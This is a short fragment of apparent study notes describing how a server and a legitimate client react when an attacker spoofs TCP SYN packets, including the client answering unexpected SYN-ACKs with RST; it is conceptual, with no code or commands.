with spoof by attacker --> server responds in broadcast to attacker with SYN ACK because the attacker and the client are no more under the same network

with spoof by attacker exploiting the client ip knowledge --> client receives a lot of SYN ACK but it responses back with RST, because it did not generate those SYN

In any case client is able to perform request
